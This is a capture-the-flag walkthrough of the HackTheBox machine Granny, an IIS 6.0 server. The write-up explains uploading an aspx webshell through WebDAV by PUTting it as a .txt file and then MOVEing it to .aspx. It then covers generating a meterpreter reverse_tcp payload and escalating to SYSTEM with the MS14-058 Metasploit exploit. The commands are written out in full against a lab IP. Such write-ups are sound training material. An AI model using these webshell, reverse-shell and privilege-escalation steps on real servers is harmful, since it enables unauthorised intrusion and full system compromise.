---
title: HTB: Granny
url: https://0xdf.gitlab.io/2019/03/06/htb-granny.html
date: 2019-03-06T22:10:00+00:00
difficulty: Easy [20]
os: Windows
tags: htb-granny, ctf, hackthebox, webdav, aspx, webshell, htb-devel, meterpreter, windows, ms14-058, local_exploit_suggester, pwk, cadaver, oscp-like-v1
---

![Granny-cover](https://0xdfimages.gitlab.io/img/granny-cover.png)

As I’m continuing to work through older boxes, I came to Granny, another easy Windows host involving webshells. In this case, I’ll use WebDAV to get a webshell on target, which is something I haven’t written about before, but that I definitely ran into while doing PWK. In this case, WebDav blocks aspx uploads, but it doesn’t prevent me from uploading as a txt file, and then using the HTTP Move to move the file to an aspx. I’ll show how to get a simple webshell, and how to get meterpreter. For privesc, I’ll use a Windows local exploit to get SYSTEM access.

## Box Info

| Name | [Granny](https://hackthebox.com/machines/granny)  [Granny](https://hackthebox.com/machines/granny) [Play on HackTheBox](https://hackthebox.com/machines/granny) |
| --- | --- |
| Release Date | 12 Apr 2017 |
| Retire Date | 26 May 2017 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Granny |
| Radar Graph | Radar chart for Granny |
| First Blood User | 02:32:30[depasonico depasonico](https://app.hackthebox.com/users/62) |
| First Blood Root | 02:31:46[depasonico depasonico](https://app.hackthebox.com/users/62) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` shows only port 80 open. It’s a website, and the webdav-scan is particularly interesting (I’ll come back to that in a minute):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA scans/alltcp 10.10.10.15
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 15:21 EST
Nmap scan report for 10.10.10.15
Host is up (0.022s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
root@kali# nmap -sC -sV -p 80 -oA scans/scripts 10.10.10.15                                                                                                                                
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-06 15:22 EST
Nmap scan report for 10.10.10.15
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   WebDAV type: Unkown
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Wed, 06 Mar 2019 20:13:57 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH                                                                                             
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.46 seconds

```

### Website - TCP 80

#### Site

The site just says “Under Construction”:

![1551903929127](https://0xdfimages.gitlab.io/img/1551903929127.png)

#### Headers

I’ll also check out the response header:

```

HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://10.10.10.15/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:358"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Wed, 06 Mar 2019 20:15:03 GMT
Connection: close

```

The `X-Powered-By: ASP.NET` tells me that aspx files may execute if I can get them onto target.

#### gobuster

I’ll start looking for paths on this server with `gobuster`, but it doesn’t find anything interesting:

```

root@kali# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.15 -t 50 -x aspx,txt,html

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.15/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : aspx,txt,html
[+] Timeout      : 10s
=====================================================
2019/03/06 15:30:10 Starting gobuster
=====================================================
/images (Status: 301)
/Images (Status: 301)
/IMAGES (Status: 301)
/_private (Status: 301)
=====================================================
2019/03/06 15:33:54 Finished
=====================================================

```

Both `/images` and `/_private` are empty dirs.

### WebDAV

#### Background

Web Distributed Authoring and Versioning (WebDAV) is an HTTP extension designed to allow people to create and modify web sites using HTTP. It was originally started in 1996, when this didn’t seem like a terrible idea. I don’t see that often on recent HTB machines, but I did come across it in PWK/OSCP.

#### nmap

I noticed in the `nmap` scan that the webdav scan showed methods such as PUT and MOVE. I might be able to upload files this way.

```

| http-webdav-scan:
|   WebDAV type: Unkown
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Wed, 06 Mar 2019 20:13:57 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH  

```

#### davtest

I’ll use `davtest` to explore further, and it will show me what types of files can be uploaded, and if it can create a directory:

```

root@kali# davtest -url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: l8Qkwc
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_l8Qkwc
********************************************************
 Sending test files
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jsp
PUT     asp     FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.php
PUT     cgi     FAIL
PUT     aspx    FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.pl
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.cfm
PUT     shtml   FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jhtml
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html
********************************************************
 Checking for test file execution
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    pl      FAIL
EXEC    cfm     FAIL
EXEC    jhtml   FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html
********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_l8Qkwc
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jsp
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.php
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.pl
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.cfm
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.jhtml
PUT File: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html
Executes: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.txt
Executes: http://10.10.10.15/DavTestDir_l8Qkwc/davtest_l8Qkwc.html

```

It looks like there are a lot of file type I can upload, but not aspx, which is what I want.

#### Manual WebDav

I’ll test myself using `curl`. First, I’ll put up a text file and verify it’s there:

```

root@kali# echo 0xdf > test.txt
root@kali# curl -X PUT http://10.10.10.15/df.txt -d @test.txt 
root@kali# curl http://10.10.10.15/df.txt
0xdf

```

The first `curl` puts the file onto the webserver, and the second proves it’s there. The `-d @text.txt` syntax says that the data for the request should be the contents of the file `text.txt`.

Now I’ll try with .aspx:

```

root@kali# curl -X PUT http://10.10.10.15/df.aspx -d @test.txt 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
</ul>
<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>

```

Just like `davtest` said, I can’t put aspx files directly.

#### Tools

There’s a tool called `cadaver` that provides command-line WebDAV interactions with a slightly simpler syntax than curl. If I are going to be attacking a WebDAV server, I’ll probably use that just for the shorter commands. That said, I’m going to use `curl` in this post to show exactly what is happening when I issue these HTTP requests. If you are interested in `cadaver`, check out the [man page](https://linux.die.net/man/1/cadaver).

## Shell as network service

### Upload Webshell

The first thing I’ll need to do is upload my webshell. Kali has a simple one at `/usr/share/webshells/aspx/cmdasp.aspx`. I’ll grab a copy:

```

root@kali# cp /usr/share/webshells/aspx/cmdasp.aspx .

```

Now I’ll upload that to target as a txt using curl and the http put method:

```

root@kali# curl -X PUT http://10.10.10.15/0xdf.txt -d @cmdasp.aspx 

```

If I look at the page now, I’ll see the code, but it’s not executed, as the server is treating it as text:

![1551906569357](https://0xdfimages.gitlab.io/img/1551906569357.png)

### Move Webshell

Now I’ll use the next webdav command, MOVE. Again, I can do this with curl:
- `-X MOVE` - use the MOVE method
- `-H 'Destination:http://10.10.10.15/0xdf.aspx'` - defines where to move to
- `http://10.10.10.15/0xdf.txt` - the file to move

```

root@kali# curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt

```

And it works:

![1551906682814](https://0xdfimages.gitlab.io/img/1551906682814.png)

![1551910243368](https://0xdfimages.gitlab.io/img/1551910243368.png)

### Meterpreter

I’ll do the same thing with a meterpreter payload. Create it:

```

root@kali# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > met.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2797 bytes

```

Upload:

```

root@kali# curl -X PUT http://10.10.10.15/met.txt -d @met.aspx 
root@kali# curl -X MOVE -H 'Destination: http://10.10.10.15/met.aspx' http://10.10.10.15/met.txt

```

Start Metasploit:

```

msf5 > use exploit/multi/handler 
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/handler) > set lport 443
lport => 443
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf5 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.14:443 

```

Trigger it, and it fails:

![1551910306439](https://0xdfimages.gitlab.io/img/1551910306439.png)

Why? If I upload `met.txt` again, I can see that the whitespace is all jacked up:

![1551910357954](https://0xdfimages.gitlab.io/img/1551910357954.png)

I’ll upload again, this time using `--data-binary` to preserve endlines and other control characters:

```

root@kali# curl -X PUT http://10.10.10.15/met.txt --data-binary @met.aspx 

```

On refreshing `met.txt`, I see it looks much cleaner:

![1551910418743](https://0xdfimages.gitlab.io/img/1551910418743.png)

Now I’ll move the file and trigger it:

```

root@kali# curl -X MOVE -H 'Destination: http://10.10.10.15/met.aspx' http://10.10.10.15/met.txt 
root@kali# curl http://10.10.10.15/met.aspx

```

And get a shell:

```

[*] Sending stage (179779 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.14:443 -> 10.10.10.15:1032) at 2019-03-06 17:05:07 -0500

meterpreter >

```

## Privesc to System

### Enumeration

On those older boxes, I am more likely to checkout local exploits, and Metasploit has a nice module for that, `post/multi/recon/local_exploit_suggester`:

```

meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > search local_exploit

Matching Modules
================

   Name                                      Disclosure Date  Rank    Check  Description
   ----                                      ---------------  ----    -----  -----------
   post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester

msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 29 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

```

There’s a lot of stuff to go for.

### MS14-058

I’ll pick one (somewhat at random, though I like this one as it says the target appears to be vulnerable):

```

msf5 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
session => 3                                 
msf5 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.14.14:4444
[*] Launching notepad to host the exploit...
[+] Process 2304 launched.
[*] Reflectively injecting the exploit DLL into 2304...
[*] Injecting exploit into 2304...
[*] Exploit injected. Injecting payload into 2304...
[*] Payload injected. Executing exploit...        
[*] Sending stage (179779 bytes) to 10.10.10.15
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 4 opened (10.10.14.14:4444 -> 10.10.10.15:1044) at 2019-03-06 17:20:47 -0500
   
meterpreter > getuid            
Server username: NT AUTHORITY\SYSTEM

```

As I mentioned in [Devel](/2019/03/05/htb-devel.html#privesc-alternative-with-metasploit), if this fails, check that the LHOST is listening on the right IP.

From there, I can get the flags:

```

C:\Documents and Settings\Lakis\Desktop>type user.txt
700c5dc1...

C:\Documents and Settings\Administrator\Desktop>type root.txt
aa4beed1...

```